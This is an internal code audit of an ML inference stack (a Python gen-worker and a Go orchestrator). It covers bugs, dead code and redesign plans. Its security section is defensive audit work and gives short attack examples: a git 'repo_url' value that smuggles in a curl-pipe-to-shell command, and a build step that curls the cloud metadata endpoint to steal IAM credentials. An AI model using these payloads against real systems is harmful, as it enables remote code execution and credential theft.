# Cozy stack audit — 2026-07-03

Scope: python-gen-worker (57k LOC src), tensorhub orchestrator side (~90k non-test Go LOC), inference-endpoints (22), training-endpoints, and the wire protocol between them. Method: 7 parallel deep-read audits. Everything below is verified with file:line evidence.

**Round 2 (same day):** six more agents covered the tensorhub surface the first round didn't — the tenant docker-build pipeline (security), the repo/registry CAS system, the AuthKit permission integration, the OpenRails billing integration, and the internal/api HTTP surface. Findings in §6 below; tasks filed as tensorhub issues #511-#520.

## Verdict

| Tier | Today | Greenfield target |
|---|---|---|
| gen-worker core (worker.py + transport) | ~14,000 LOC, 12.5k-line god class, ~15-40 threads | ~1,600 LOC, asyncio-first, 6 modules |
| gen-worker model layer | ~14,000 LOC in-repo (models/conversion/clone/pipeline/quant/accel/…) | ~2,500 LOC in-worker + ~4k `cozy_convert` package moved out |
| Wire protocol | ~25 message types, 4 streams, 4 liveness + 3 crash-recovery mechanisms | ~12 messages, 1 stream, 1 `attempt` fencing int, gRPC keepalive only |
| tensorhub orchestrator | ~75k LOC, 3 binaries + router, pg+redis+gossip | ~8-12k LOC, 2 binaries, postgres only |
| Endpoint hello-world | class + mandatory setup + 4 structural elements + endpoint.toml; README's API raises ImportError | one `@endpoint` decorator, ~20 lines |

~10-12k LOC of gen-worker and ~35-45k of tensorhub is deletable or movable. Consumers exercise ~15 symbols of gen-worker's public surface.

## 1. Showstopper bugs

**gen-worker runtime (src/gen_worker/):**
1. **Graceful drain crashes every time.** worker.py:6216 constructs `pb.WorkerDrainResult(worker_id=...)` — field removed from proto in #321 (proto:728-731) → `ValueError` swallowed by receive-loop except (worker.py:5838-5842). Worker rejects new jobs but never drains, never reports, never self-terminates. Pods only die by external kill.
2. **Job results silently dropped during reconnect.** `_send_message` drops anything while `_stop_event` is set (worker.py:5593-5616); a handler finishing in that window loses its result forever. Also: drop-oldest overflow policy applies to *results*, not just events (3597-3614); aux results-stream death strands everything in `_results_outgoing_queue` until a full primary reconnect that may never come (4548-4571).
3. **Reconnect backoff (#338) is unreachable.** After `_stop_event.wait()` returns (run(), worker.py:5565), the guard at 5581 requires the event to be clear — it can't be. Lost stream → immediate reconnect storm, the exact bug the 40-line comment claims was fixed.
4. **Model-load events never emitted.** `_handle_load_model_cmd` references undefined `started_at` (worker.py:6834) → NameError swallowed at 6846-6847. And the load runs inline on the receive thread, blocking dispatch/cancel for up to 300s+ (5958, 6774).
5. **Timeouts are decorative.** `timeout_ms` lands in `ctx._deadline` and nothing reads it; no worker-side watchdog. A hung handler holds the GPU semaphore forever = bricked worker.
6. **Micro-batching is structurally inert.** GPU semaphore acquired *before* submitting to MicroBatchAggregator (worker.py:9544→9593): on a 1-GPU worker batch size is always 1. The whole aggregator (api/micro_batch.py, 383 LOC) can never batch where it matters.
7. **`cancel_queued_only` cancels running work** (worker.py:7451-7482). `InterruptJobCommand.item_ids/cancel_queued_only` parsed then ignored.
8. **Transient prefetch failure permanently disables a function** until restart (worker.py:6608-6615) — any exception → `_mark_ref_terminally_failed`.
9. **JWT "verification" never verifies** — `_jwks_cache` hardcoded None (worker.py:449-453); all of `_worker_auth.py` is dead.
10. **`CUDA_VISIBLE_DEVICES` mutated per request** process-wide, post-CUDA-init (ineffective), racy for gpu_count>1 (worker.py:2107-2147).

**gen-worker model layer:**
11. **VRAM auto-offload uses total not free VRAM** (inference_memory.py:204,228-237; `get_available_vram_gb` never consulted). New `OFF_HEADROOM` (commit 5347209, :235) amplifies it. Second model on an occupied card → `"off"` → OOM.
12. **VRAM double-counting**: `estimate_pipeline_size_gb` sums all params regardless of device (inference_memory.py:126-147); CPU-offloaded pipelines booked as full VRAM (models/cache.py:355,371); shared components counted twice (shared_components.py:272); hardcoded 5.0 GB fallback (worker.py:9409).
13. **Permanent snapshot-digest poisoning**: failed build leaves the exception cached for process lifetime (models/cozy_snapshot_v2.py:188-232). One network blip = model permanently unloadable.
14. **Blocking HF download inside `async def`** (models/ref_downloader.py:169); loader does rglob/stat/JSON on the loop (pipeline/loader.py:1130-1214).
15. **Silent wrong-dtype checkpoints**: fp8:e5m2→e4m3 and int4→nf4 conversions stamp the *requested* dtype, not the produced one (conversion/inline_convert.py:102-115 vs :624,:757); unknown dtype strings silently load as bf16 (loader.py:313-326).
16. ~190 lines of Flux2-Klein-specific filename hacks inside the generic worker (worker.py:8748-8940).

**tensorhub orchestrator:**
17. **Completed requests never freed** — `RuntimeStorage.DeleteRequest` has zero callers (runtimestore/runtime.go:1175). Unbounded memory; `jobHasActiveJobs` full-scans the growing map per submit (grpc/scheduler.go:341-357).
18. **pruneStaleWorkers hand-rolls requeue** (grpc/scheduler.go:430-449): mutates without the request mutex, leaks the fairness in-flight slot permanently, never persists `queued` to pg, skips billing-hold handling. The stream-disconnect path does it right (`RequeueAssignment`).
19. **Redis-down = split-brain**: ResilientStore falls back to local "success" lease acquisition (sharedstate/resilient_store.go:511-530); lease `Epoch` is published but checked by nothing (redis_store.go:940-976) — stale owners keep dispatching up to 10s.
20. **Token streaming does a postgres INSERT + pg_notify per delta** (connect_worker_handlers.go:43-100 → event_store.go:33-46); SSE reads them back out of postgres. Worst latency decision in the stack.
21. **Builder timeout contradiction**: River kills attempts at 30min (workers/builder_job.go:171-178) so executor's 45min/3h/4h budgets are unreachable — images needing >30min can never build; crashed builds stay `running` forever (no sweep); `PushWithDocker` pushes an image never loaded into the daemon (always fails).
22. Invoke hot path: 2 authz passes, sync moderation, sync billing HTTP, per-job token mint + ref-resolution HTTP at dispatch (scheduler_dispatch.go:206-214), O(n) queue-position scans.

**Process:**
23. **Master red for ~25 days**: 6 failing tests (test_cli_describe.py ×4 broken by a53627b on Jun 8; test_inference_memory_select.py ×2 by 5347209 on Jun 23). CI runs and is ignored; a release tag today would fail publish.
24. **README/docs teach a deleted API**: `@inference_function` raises ImportError (api/decorators.py:1414-1439); every README quickstart fails on import (README.md:47-135, docs/endpoint-authoring.md, endpoint-envs.md, endpoint-toml.md, scaling-hints.md, dockerfile.md).
25. `pb/worker_scheduler_pb2.pyi` is stale (pre-tenant-rename); no proto codegen task exists anywhere. `task test`/`task lint` fail on fresh clone (dev extra not installed); Pillow floors conflict between core deps and extras; `tomli-w` dep is unused.

## 2. Dead code (delete with zero behavior change)

**gen-worker — worker core (~2,500 LOC):** nothing sets `_is_inference_function`/`_is_training_function` anymore, so the entire legacy function-shape stack is unreachable: `_execute_request` (worker.py:10255-11046), `_execute_training_request` (11048-11277), `_inspect_request_spec` (3431-3560), function-shape scan (2234-2290), asset materialization suite (3710-4122), LoRA overlay stack (12074-12303), `_resolve_model_id_for_injection` (12388-12468), `_binding_to_wire` (192-291). Always-one-value knobs: `_jwks_cache`, `max_input/output_bytes`, `_models_ready_on_connect` (env var doesn't exist), `_drain_timeout_seconds`, `_local_model_cache_dir`, `_filter_prefetch_for_disabled_functions`. Zero-caller: `_enforce_model_allowlist`, `_prefs_for_canonical`, `payload_key_status`, `_emit_residency_for_refs`, run_metrics `emit_best_effort`/`add_upload_time`. `_handle_job_request` reads 5 proto fields that no longer exist (worker.py:7128-7143). wire_protocol.py = 67 lines wrapping two ints.

**gen-worker — API/discovery (~1,500 LOC):** discovery legacy-marker paths (discover.py:472-521, 524-668, 671-734, 883-921, 925-1004); toml_manifest ~330 of 592 (TensorhubModelSpec, always-empty fields, version helpers); orphaned validators decorators.py:440-471 (meaning the documented Dispatch/Literal validation never runs); migration stubs + `_REMOVED_PUBLIC_SYMBOLS` + `__getattr__` tombstones; `rate_limit_per_invoker` and `prefer_distilled` (emitted, consumed by nothing); `@invocable.stage`/`_StageSpec` (~150 — worker never reads `__gen_worker_stage_methods__`); request_context: `save_bytes_create`, `save_output_stream`, `finalize_checkpoints`, discarded `publish_intent`, duplicated `read/write_repo_metadata` + `materialize_blob`; cli `repl` (229) + `describe --json` no-op.

**gen-worker — whole packages with zero callers anywhere** (src, tests, both endpoint repos): `quant/` (455), `accel/` (598), `cache/` (219), `compile_helpers/` (285), `parallelism/` (225), `engines/` (425, gating branch worker.py:7669 never satisfied). Also `conversion/dtype_utils.py` (289), `pipeline/` mostly bypassed by the production injection path (~1,000 shrinkable), clone dead-dedup scaffolding + duplicate finalize (~1,800-2,000), `presets.py`. Exports never imported by any consumer: `batched_inference`, `Clamp`, `PositivePrompt`/`NegativePrompt`, `MediaAsset`, `Compute`, `Tensors`, `load_loras`, `with_oom_retry`, `Done`/`Error`/`TokenStreamSignal`, `Binding`, 9 of 10 error classes.

**Protocol (both repos):** `ActiveAssignmentResume` (never sent; ~60 LOC Go resume path unreachable), `WorkerKVPrefixCache` + KvPrefixIndex (written by nobody, placement consumer "wiring TODO"), `JobExecutionObservation` fields 16-21 (RLS learner fed zeros forever), `LoadModelResult.size_bytes` (never emitted → model-size optimizer runs on defaults permanently), `InterruptJobCommand.item_ids/cancel_queued_only/assignment_attempt_epoch`, `DownloadModelCommand.priority`, `WorkerResources.image_digest/git_commit`, `supports_split_streams`/`stream_role` (stored, never read), delta `function_name/timestamp` fields, ~40 reserved tags, empty-request-id worker_events (all silently dropped by Go, incl. cargo-cult `model.ready` emit for a gate deleted in #321). Dedicated-heartbeat-stream machinery exists only for no-auth dev mode, yet Go carries permanent prod complexity for it — while in prod (JWT) heartbeats share the control stream, unmitigating the starvation problem the second stream was built for.

**tensorhub:** frontend embedded but unwired (static.StaticFS zero importers, NoRoute 404s); `cmd/router.go` dead entrypoint; `tools/checktar`; write-only tables (`admin_actions`, `endpoint_pricing_audit`, `platform_policy_denials`, `resource_visibility_audit`, `request_runtime_artifacts`, `request_runtime_events`, `endpoint_model_slot_default_events`); dead config keys (vault approle/mtls, `billing.platform_arrears_cap_micros`, phantom `billing.degraded_allow`, orphan env vars incl. wrong-key `BOOTSTRAP_ROOT_ORG_SLUG`); lease-Epoch subsystem; `InMemoryStore.SubscribeOwnerChange` blocks forever; 12 docker-CLI inspect methods (~380); all `directPush` branches; moderation benchmarks (903) in the prod cobra tree.

## 3. Design problems (why rewrite beats patch)

- **worker.py is 5 copies of one lifecycle.** SerialWorker/BatchedWorker/Conversion/legacy-fn/legacy-training dispatch paths are near-identical 250-800-line clones (metrics, events, semaphore, decode, invoke, encode, send). One `EndpointSpec{instance, method, payload_type, output_mode, is_async, needs_gpu, finalizer}` covers all.
- **Threads + asyncio mixed everywhere**: ~15-40 threads, `asyncio.run()` inside threads, `_ensure_batched_loop` check-then-create race (7515-7560), per-request state on `self`.
- **5 gRPC channels where 1 suffices**; split streams exist to work around head-of-line blocking the worker itself creates. Results and events share a drop-oldest loss policy — results must never be droppable.
- **The event firehose**: ~15 untyped JSON WorkerEvents per request + RunMetricsV1 triple-emission; Go persists only request-scoped ones and parses only `worker.model.download.*` — the rest is a bit bucket.
- **Three products fused in one package**: worker model layer (keep), clone+conversion mirror/convert/publish ETL (~14.8k, belongs in its own package — its tenant SDK `Source`/`Dataset`/`ConversionContext` has zero generation-path callers and belongs with training-endpoints), dead accel stack. hf_classifier.py (1,324) reimplements `HfApi.list_repo_files` + `snapshot_download(allow_patterns=)`; gguf_utils hand-parses GGUF instead of the `gguf` package; two HF download stacks; two loaded-pipeline registries; three disagreeing low-VRAM deciders; dtype logic in ≥5 places; SM detection ×5.
- **API surface**: six spellings of one method marker; `@inference` vs `@batched_inference` false axis (async-ness already inferred); `Repo` dual-arity positional trap; 2,193-line RequestContext god object (~44 members, 4 cancellation spellings, 5 save methods, monkey-patched subclass methods at import); `endpoint.toml` reduced to one string but still mandatory; import-time torch import via request_context (multi-second `gen-worker --help`); three separate walkers over the same decorator attributes (discovery, worker, CLI).
- **Orchestrator**: coordination fabric (partition CAS leases + gossip + ResilientStore + 4 route-to-owner mechanisms, ~3.5k) is a latency optimization over the pg-hydration path that is the actual correctness mechanism — and it's what creates the split-brain windows. Autoscale profit-maximizer (M/M/1 + demand forecast + churn logistic + switching cost, ~3k) for fleets of 0-2 pods. Tier/flex-wave machinery ~1.5k pre-launch. Two submission surfaces. Two pgx LISTEN implementations. 601-LOC redis rate limiter duplicating OpenRails admit. Webhooks via bespoke pg polling with River already a dependency. 1,406 issue-number references in comments.
- **Endpoints pay for all of it**: 7 hand-rolled `_resolve_model_path` copies (setup() injection is polymorphic "depending on SDK version"), 11 identical image-save ceremonies, 14 seed-generator helpers, 5 DIY per-pipeline lock registries, 10 `apply_low_vram_config` epilogues, 3 hand-rolled vLLM boots + 1 llama-server subprocess manager, copy-pasted streaming-delta structs, resources duplicated toml↔Python ("not yet plumbed — known orch bug", chatterbox endpoint.toml:17-22), 700 lines of VRAM-residency management inside flux.2-klein-9b that belongs in the worker.

## 4. Greenfield design

### 4.1 Protocol v2 (~12 messages, 1 stream)
Principles: identity per connection not per message; one liveness mechanism (gRPC HTTP/2 keepalive, period); typed messages only — no `payload_json` fabric; durable state in postgres only; streaming bytes never touch the database; outputs >~64KB go to blob storage via presigned PUT, result carries a ref.

Worker→orch: `Hello{worker_id, release_id, ver, resources, in_flight[{request_id, attempt}]}`, `StateDelta{...on change only}`, `JobAccepted{request_id, attempt}`, `JobResult{request_id, attempt, status, output|blob_ref, metrics}`, `JobProgress{request_id, seq, chunk}`, `ModelEvent{ref, state: DOWNLOADING|ON_DISK|IN_VRAM|EVICTED|FAILED, vram_bytes}`, `FnUnavailable{fn, reason}`.
Orch→worker: `HelloAck{config, keep[]}`, `RunJob{...}`, `CancelJob{request_id, attempt}`, `ModelOp{ref, DOWNLOAD|LOAD|UNLOAD}`, `Drain{deadline_ms}`.

Fencing = single `attempt` int (replaces assignmentEpoch + duplicate_request_id handshake + resume epochs). Dispatch retried until `JobAccepted`. Streaming fans out via in-memory per-request pub/sub on the owning replica; persist only terminal state. Renumber proto from field 1; one version, reject others. Delete: mega-oneof envelope, split streams, heartbeat-as-registration + forwarding, WorkerForwarder relay (router redirects only), padded-keepalive envelope, app watchdog, redis stream lease.

### 4.2 gen-worker v2 (~6-8k LOC total library)
```
transport.py   ~300   channel, auth, bidi stream, bounded send queue (results never dropped), reconnect+jittered backoff
registry.py    ~200   decorator scan → EndpointSpec table (one walker, shared with CLI)
executor.py    ~350   intake, GPU semaphore, real deadline+cancel watchdog, sync-on-thread/async-on-loop, deltas, result
models/        ~2500  refs.py (keep grammar) · download.py (ensure_local → CAS | hf snapshot_download+allow_patterns | civitai; fix digest poisoning) · memory.py (FREE-vram ladder, CUDA-resident-only estimates, one decider) · residency.py (ModelCache LRU tiers + SharedComponentCache folded in)
lifecycle.py   ~150   hello/state-delta, startup phases, drain (works)
worker.py      ~150   wiring
entrypoint.py  ~100   keep
uploads        ~1050  keep as-is (presigned_upload/_upload_transport/s3_transfer are the best code in the repo)
```
Asyncio-first: one loop owns stream/heartbeat/dispatch; sync handlers via `to_thread` gated by GPU semaphore. No PipelineLoader — endpoints call `from_pretrained` themselves with a typed injected path/pipeline. clone+conversion → separate `cozy_convert` package (~4k: hub-API ingest, one streaming shard writer, dtype cast + quant via libraries, repackage, ONE finalize path, `gguf` package); `Source`/`Dataset`/`ConversionContext` tenant SDK moves next to its only consumers (training-endpoints).

### 4.3 Endpoint API v2
One decorator, function-first; class only for state; optional `setup()`; single-positional-ref bindings; async generator = streaming; variants as data (kills Case/parametrize + dispatch + flavor-vs-dtype); ctx ≤15 members with ONE cancellation spelling, `ctx.save_image/audio/video → typed Asset`, `ctx.generator(seed)`; 4 error types; worker owns placement/offload/logging/per-pipeline serialization; first-class server-subprocess runtime (vLLM/llama-server boot+health+abort); `[tool.gen_worker]` in pyproject replaces endpoint.toml; CLI: `run`/`serve`/`invoke`/`prefetch`, keep the `field=value` grammar. Expected effect: every endpoint ~3x shorter; deletes all ten §3 boilerplate clusters.

```python
@endpoint(model=HF("black-forest-labs/FLUX.1-dev", dtype="bf16"),
          resources=Resources(vram_gb=24),
          variants={"fp8": (flux_fp8, Resources(vram_gb=14))})
class Generate:
    def setup(self, model: FluxPipeline): self.model = model
    def generate(self, ctx, p: Input) -> Output:
        img = self.model(prompt=p.prompt, generator=ctx.generator(p.seed)).images[0]
        return Output(image=ctx.save_image(img))
```

### 4.4 tensorhub orchestrator v2 (~8-12k LOC)
Two binaries: **hub** (API + scheduler + supply; N replicas; pg advisory lock per partition — lock death = release, no TTL/steal/gossip/epoch/split-brain; or 1 active + 1 warm standby and delete partitioning) and **builder** (River worker; single timeout authority; stuck-`running` sweep; drop docker-push fallback). Delete the router binary and redis from the control plane. State: postgres (`requests`, `request_events` w/ NOTIFY, `workers` projection) + rebuildable per-replica RAM (keep the hydrate/adopt design — best part of the current system — plus mandatory GC of terminal entries). ONE requeue path (stream-close and lease-expiry sweep converge on it). One submit route. Cap-tokens cached per (worker, tenant), not minted per job. Moderation async unless policy=mandatory. Autoscale: `desired = clamp(ceil(queue_depth/target_concurrency), 0..max)` + idle retirement + global $/hr burn cap + cold-start hold; keep learned boot-ETA as display only.

## 5. Execution plan

- **Phase 0 — stop the bleeding (days, mechanical):** delete all §2 dead code (~15k LOC across repos); fix the 6 red tests (or delete with their subjects); fix drain crash (#1), load-event NameError (#4), result-drop-during-reconnect (#2), backoff (#3), free-vs-total VRAM (#11), digest poisoning (#13) — these survive into v2; quarantine README/docs to a single accurate quickstart; add `task proto` codegen; drop tomli-w + redundant extras; make Taskfile use `--extra dev`.
- **Phase 1 — protocol v2:** write the new .proto (both repos), regen, contract doc. Everything else keys off this.
- **Phase 2 — gen-worker v2 core:** new transport/registry/executor/lifecycle per §4.2 against protocol v2; keep uploads; delete worker.py. One e2e test: fake gRPC scheduler + real worker + marco-polo (the current suite's real-socket/SIGINT style is good — extend it to the gRPC loop, which today has zero coverage).
- **Phase 3 — orchestrator v2:** advisory-lock coordination, one requeue path, in-memory streaming pub/sub (kill per-token pg INSERT), request GC, simple autoscaler, single submit surface. CI e2e: hub + real worker container.
- **Phase 4 — API v2 + migration:** new decorator/context, `cozy_convert` split, port endpoints (mostly deletion), rewrite docs concise, delete endpoint.toml.

---

# 6. tensorhub deep-dive (round 2) — build pipeline, repo/registry, authz, billing, api

Filed as tensorhub `agents/progress.md` #511-#520. The orchestrator core / protocol / scheduling were round 1 (#503-#510). This round is everything else in the ~90k-LOC Go repo.

## 6.1 Security — fix before anything else

**CRITICAL #1 — RCE via tenant `repo_url` (`internal/api/endpoint_source_code.go:969-995`).** The git-ref deploy path passes tenant-supplied `repo_url`/`git_ref` straight to `exec.Command("git","clone", repoURL, …)` / `git checkout … gitRef` with no scheme/host allowlist, no `--` separator, no `GIT_ALLOW_PROTOCOL`. This runs **in the API webserver process** — the most privileged in the system (Postgres, S3, registry-push OAT, HF_TOKEN, Redis, Vault). A tenant with `org:endpoint:upsert` (every paying tenant) sends `{"repo_url":"ext::sh -c 'curl…|sh'"}` → arbitrary code execution, bypassing the entire build sandbox. Also enables `file:///` local read, `https://internal/` SSRF, and `-`-prefixed arg injection. Found independently by 3 agents. Minimum fix: https-only + host allowlist, reject `-`-prefixed refs/URLs, set `GIT_ALLOW_PROTOCOL=https`, move the clone into the sandboxed builder. Or delete the git-ref deploy path entirely.

**CRITICAL #2 — credentialed CORS reflection (`internal/api/api.go:373-383`).** `Access-Control-Allow-Origin: <echoed Origin>` + `Access-Control-Allow-Credentials: true` on all routes, including AuthKit's cookie routes. Textbook cross-site credential theft. Fix: static allowlist, no reflection with credentials.

**Build isolation (highest-value reachable secret):** default `build_backend` is `docker` (`config/config.go:608`), which runs `docker buildx` against the host daemon via a shared privileged BuildKit container named `tensorhub`, reused across all tenants. Tenant build steps have **unrestricted network egress** (no `--network=none`, no NetworkPolicy anywhere) → a build `RUN curl http://169.254.169.254/…` steals the instance's cloud IAM credentials. The hardened rootless-k8s backend exists (`k8s_backend.go:436-461`: rootless buildkit, non-root, drop-ALL, no SA token, presigned URLs) but is opt-in, and its gVisor `runtimeClass` defaults to `""` (`config.go:610`). The docs claim every build runs `--no-cache` for cross-tenant isolation; the code never passes it (shared unscoped layer cache → poisoning).

**Supply chain:** HF validation is TOCTOU — `huggingface_validator.go:31-86` checks `owner/repo` format + one existence GET, pins no revision SHA, and the model loads at the mutable `main` ref on the GPU worker (malicious pickle executes on load); `ValidateManifestExternalRefs` discards its own ctx+validator (`:105-106`). Nothing is digest-pinned (base images are mutable tags, `COPY --from=…uv:latest`, deps `--no-hashes`). One Docker Hub push OAT has push+pull to the entire `tensorhub/*` org — reads/writes every tenant's images.

**Smaller security bugs (internal/api):** tenant-secret clobber on env-create conflict (Vault written before the DB insert that 409s, `endpoint_env.go:118-139`); fail-open delegated rate limiter (Redis error → limit skipped, non-atomic INCR-then-EXPIRE, `platform_delegated_policy.go:140`); unauthenticated unbounded SSE on `/public/live-feed` (2s pg poll, no cap); worker-token scope taxonomy mismatch (`requireScope("org:repo:write")` gates dataset/media routes, `resource_visibility.go:24-46`); non-transactional tag flip leaving endpoint/function release pointers disagreeing (`endpoints_release_restored.go:575-584`); tautological self-comparison guard (`resource_visibility.go:176`, found by 3 agents); no max-TTL cap on worker capability tokens despite the comment promising one (`capability_jwt.go:322-324`). Off the build path but policy-relevant: `user_file_moderation_worker.go` fails **open** on VLM error.

## 6.2 Repo/registry — good core, leaky edges

The CAS core is genuinely sound: flat BLAKE3 content-addressing (`storage/cas_paths.go:23-36`), live cross-tenant dedup gated by an access-claim check that closes the existence oracle (`blob_claim_check.go:42-70`), server-verified sizes, server-computed manifest digest, publish-time blob ACL, grant-scoped capability tokens with job binding + replay guard. Multiple prior race fixes are visibly correct. Keep it.

**Correctness bugs (#514):**
- **Worker publish likely broken (P0, confirm e2e):** orchestrator mints cap tokens with only fine-grained `grants:[{do:"create_checkpoint"}]` (`orchestrator/server/server.go:2465-2489`, "no coarse scopes") but gen-worker hard-raises `ValueError` unless legacy `tensor_repos_version_create/update` claim arrays name the repo (`_helpers.py:268-311`). The two ends disagree → publishes may die client-side. Pairs with gen-worker #364/#368.
- **Hard-delete leaks all modern blobs:** `hardDeleteRepo` filters snapshot digests by `HasPrefix(d,"blake3:")` (`repos_management.go:1464`), but modern digests are bare 32-hex → set empty → `blob_reverse_lookup` survives → S3 bytes never reclaimed.
- **Reaper race:** expired-session cleanup checks only `blob_reverse_lookup` (`upload_sessions.go:499-510`), missing dedup claims another open session recorded in `completed_files` → can delete bytes a finalizing manifest points at.
- **Trusted manifest sizes** on the explicit-manifest path (`repo_revision_publish.go:856-862` — the VRAM-poisoning vector a prior fix closed only for the dedup path); **no `AbortMultipartUpload`** for orphaned uploads (silent R2 bleed); dataset-rows PUT rewrites the entire parquet per sample and leaks the old shard (`datasets_rows.go:184-195`).
- **Silent visibility flip:** `POST /repos` on an existing repo does `on conflict do update set visibility='private'` (`repository/repos.go:23-32`) — unaudited private-flip bypassing the visibility audit table.

**Sprawl (#515):** the same multipart-stage-verify-promote pipeline is implemented **four times** (repo / commits / dataset / media) + a 5th inline path; `/commits` is 1,034 LOC replaying its sibling handlers through a synthesized gin context + response-capturing writer; `upload_sessions.kind` has 4 values but only `checkpoint` is ever created; three buckets share the `blobs/blake3/…` layout with two pin mechanisms (brl vs ref-count) + a third un-pinned. `internal/api` repo+dataset+upload + `internal/repository` + GC workers ≈ 14k LOC → one generic CAS upload service ≈ 2.8k. The #259 keyspace-unification left ~15 shim functions carrying ignored `owner/visibility/domain` params.

## 6.3 AuthKit — authn fine, permission-groups unfinished, bump blocked

Authn is on the modern authkit construction (client-first `core.New` + `authhttp.NewServer`, no Transforms DSL, embedded engine as IdP). The permission-group half is the problem, and the version bump is blocked.

**Bump blockers (#516):**
- **Compile breaks:** `platformjwt.go:201` calls deleted `jwtkit.NewAutoKeySourceWithPath`; `:212-219` does `os.Setenv("ENV","production")` to trick authkit's (now-removed) env sniffing. authkit v0.78.0 also renames `authkit/http→authhttp`, `jwt→jwtkit`, `oidc→oidckit` (10+ tensorhub files). **Transitive lockstep:** pinned `openrails v0.86.0` *also* breaks against authkit v0.77+, so neither moves without a coordinated openrails release.
- **Migration catastrophe:** tensorhub ships `0027_authkit_permission_groups_compat` recreating authkit's *old* v0.60-era schema (deleted_at/metadata/parent_persona/uses/max_uses) with triggers/indexes on those columns. v0.77's new baseline dropped them → fresh DB: 0027 fails outright; existing DB: every `CreatePermissionGroup` fails at runtime (engine stops writing `parent_persona`, trigger still demands it). Pre-launch: adopt authkit's baseline, delete the compat migrations, rebuild DBs.
- Fail-closed keys: v0.77 errors unless `Keys.AllowEphemeralDevKeys` is set; tensorhub never sets it → dev/CI boot breaks. Set it in one dev-config place.

**Permission-group gaps (#517):**
- Collaborator feature is **unreachable end-to-end**: `AssignResourceCollaborator` is implemented but has **zero HTTP routes**, and the resource group's `instance_slug` is a private sha256 composition (`owner_resolver.go:34-57`) no client can compute. No list/remove either.
- **Split-brain resolver:** hand-rolled `EffectivePermissionsForUser` (`owner_resolver.go:120-181`) reimplements authkit's `ListEffectivePermissions` but doesn't know custom org roles → a custom-role member is authorized for resource actions (walk-up → authkit `Can`) but silently loses all org-internal perms (`org:billing:spend`, `org:secrets:*`).
- **Stale-collaborator resurrection (security):** groups are permanent in v0.77 (no delete); tensorhub deletes a repo but never the mirror group → recreating a resource with the same name recomposes the same group → old collaborators keep `RT:RT:*` on the new resource. Deny-by-default → grant-by-history.
- **Three overlapping per-resource share mechanisms** (authkit resource groups #498, `repo_access_grants` whitelist #459, 4th-segment scoped tokens); repos have all three, endpoints/datasets have two. Recommendation: keep the whitelist, drop per-resource permission groups until authkit grows deletion.
- Dead: entire admin-audit machinery (`.Record()` never called), `ctxTenantRoles`/`ctxUsername` read-but-never-set, `DefaultRoles()` (no prod caller, drifts from authoritative `GroupTypes()`). Redesign ~1.8-2.2k from ~6.6k.

## 6.4 OpenRails billing — model correct, durability + ordering wrong

The Admit→Capture/Release shape is correct against openrails' `AdmissionClient` contract. The gaps are ordering, durability, and the unfinished #502 echo.

**Correctness (#518):**
- **Leaked holds (gate ordering):** `admitOpenRails` runs at `action_bridge.go:206`, but VRAM fail-fast (`:254-308`), `CreateRequest` failure (`:329`), and repo-ref persist failure (`:335`) all return **without Release** → the money hold pins payer capacity until TTL. Move cheap local gates before the hold; Admit last.
- **Lost settle on outage / no durability:** Capture/Release are single-shot, log-only, 5s background ctx, **no outbox, no retry, no reconcile** (`authorizer.go:201-219`). OpenRails down at settle → unbilled rendered work forever. Also executed **synchronously inside the gRPC worker-result recv handler** (`connect_worker.go:1252-1301`) → up to 5s head-of-line blocking per result.
- **#502 (rendered-but-unbilled on Redis flush): confirmed unmitigated, needs no bump** — `openRailsCaptureUsage` never echoes CustomerID/Currency/Invoker/AdmitSource (`platform_budget_settlement.go:56-62`); the #676 fallback fields exist in the pinned SDK. Echo them (AdmitSource must be `"invoke"`, not the `"admit"` default).
- **Failover loses billing identity:** hydration restores `OpenRailsRequestID` but not PayerID/Invoker → post-failover failure silently skips `ReportWastedSpend`. **Cancel/result race:** `scheduler.go:197` writes `Completed=true` without the mutex; once #502 echo lands, capture-after-release will *land* via the fallback → charging canceled requests unless settle transitions are serialized. Fail-open = free compute (the `ReconcileEnqueuer` seam has zero implementations); spend-cap fail-open on pg error.
- **Fix is one mechanism:** a durable `billing_settlements` outbox row written in the same tx as `persistJobResult`, drained by a River worker (capture/release are request_id-idempotent). Simultaneously fixes lost settles, head-of-line blocking, sweeper hold leaks, failover identity, and the cancel race (single-writer per request).

**Version bump (#519):** openrails → v0.86.1/HEAD; authkit import renames (authhttp/jwtkit/oidckit); delete `merchantCtxClient` (upstream now injects merchant ctx); set `MerchantSource:"manifest"` and `ProviderWriteMode:"readonly"` in embedded config — the latter **unblocks embedded prod boot, which fails today** (`config.Validate` requires `provider_write_mode` outside dev, never set). The migration squash is safe (migratekit `Prefix()` normalizes). Delete dead: `BillingQueue` unused export, `ReconcileEnqueuer` vapor seam, deprecated `AdmitRequest.Tier` alias, 4 copies of `firstNonEmpty`.

## 6.5 internal/api — sound auth, sprawled structure (#520)

Secrets design is correct (Vault KV-v2, runtime-only injection, never baked into images or logs). Sprawl: the "internal API" is HTTP handlers invoked through `httptest.NewRecorder()` + JSON round-trips on the invoke-authz hot path (replace with typed Go interfaces, ~-700 LOC); worker access is a hand-maintained 25-regex shadow of the route table (delete it — map worker grants to the same `authz.Permission` set); the platform-delegated family is ~2,600 LOC across 8 files (`platforms_delegated.go` registers an empty group; `platform_delegated_metrics` is write-only) → ~1,200 with evaluation moved into `pkg/platformpolicy`; four different tenant-resolution helpers. Target ~15-16k from ~32k. `internal/vault` constructs the official client then never uses it (raw http.Client with static token instead).

## 6.6 Revised whole-repo target

tensorhub ~90k non-test LOC → **~20-25k**: orchestrator core ~8-12k (#503-#510), build pipeline ~3k (#513), repo/registry CAS ~2.8k (#515), authz ~2k (#517), api ~15-16k→ folds into the above numbers, billing net +250. Two binaries (hub + builder), postgres-only control plane, one rootless-k8s build backend, one CAS upload service, one permission resolver, one durable billing outbox.
